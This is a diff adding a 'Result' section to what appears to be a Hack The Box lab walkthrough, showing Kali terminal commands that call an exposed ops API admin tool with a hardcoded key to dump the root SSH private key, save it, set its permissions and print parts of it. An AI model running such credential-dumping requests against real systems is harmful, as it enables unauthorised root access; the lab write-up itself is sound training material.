@@ -1965,6 +1965,38 @@ chmod 600 /tmp/root_id_rsa
 - `chmod 600 /tmp/root_id_rsa`
 	- Description: Sets permissions to owner read/write only.
 	- Purpose: SSH refuses to use private key files that are readable by group/others — same reasoning as the authorized_keys permissions earlier, but this time on the client side (your Kali machine).
+
+**Result:**
+
+```shell
+
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
+└─$ curl -s http://localhost:15000/tools/call \
+  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
+| python3 -c "import json,sys; print(json.load(sys.stdin)['root_private_key'])" \
+> /tmp/root_id_rsa
+
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
+└─$ ls /tmp/root_id_rsa                                   
+/tmp/root_id_rsa
+
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
+└─$ chmod 600 /tmp/root_id_rsa
+
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
+└─$ head -3 /tmp/root_id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
+
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
+└─$ tail -3 /tmp/root_id_rsa
+lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
+-----END OPENSSH PRIVATE KEY-----
+
+```
 <div align="center">
 <br>
 <br>
